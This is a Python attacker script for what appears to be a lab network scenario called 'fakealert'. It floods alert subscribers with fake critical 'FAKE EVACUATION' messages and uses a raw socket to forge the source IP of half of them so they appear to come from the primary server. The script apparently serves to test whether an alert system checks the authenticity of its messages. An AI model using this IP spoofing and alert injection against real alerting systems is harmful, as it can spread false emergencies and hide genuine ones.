"""
Attacker tool for the 'fakealert' scenario. Run on h6. Sends fake, unsigned ALERT messages
straight to the subscribers' alert ports, half of them with a forged source IP (pretending to be
the primary server, using a raw socket).

  python3 tools/rogue_alerts.py [rate_per_s] [duration_s]
"""
import json, os, socket, struct, sys, time
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "topology"))
import netconf as C

rate = float(sys.argv[1]) if len(sys.argv) > 1 else 20
duration = float(sys.argv[2]) if len(sys.argv) > 2 else 15
targets = [(C.ip(h), port) for h, port, _, _ in C.SUBSCRIBERS]
FORGED_SRC = C.ip(C.PRIMARY)

plain = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)     # we build the IP header ourselves


def forged(src, dst, dport, payload):
    udp = struct.pack("!HHHH", 40000, dport, 8 + len(payload), 0) + payload  # UDP checksum 0 = not used
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 46 << 2, 20 + len(udp), 0, 0, 64, 17, 0,
                     socket.inet_aton(src), socket.inet_aton(dst))           # kernel fills the IP checksum
    return ip + udp


end, n, k = time.time() + duration, 0, 0
while time.time() < end:
    for dst, port in targets:
        k += 1
        msg = {"type": "ALERT", "seq": 900000 + k, "ts": time.time(), "alert_id": f"fake-{k}",
               "srv": "PRIMARY", "alert_type": "FAKE EVACUATION", "priority": "CRITICAL",
               "location": "Everywhere", "message": "Fake alert from h6", "deadline_ms": 1000}
        data = json.dumps(msg).encode()
        try:
            if k % 2:
                plain.sendto(data, (dst, port))
            else:
                raw.sendto(forged(FORGED_SRC, dst, port, data), (dst, 0))
            n += 1
        except OSError:
            pass
    time.sleep(1.0 / rate)
print(f"rogue: sent {n} fake alerts ({n // 2} with forged source {FORGED_SRC})", flush=True)
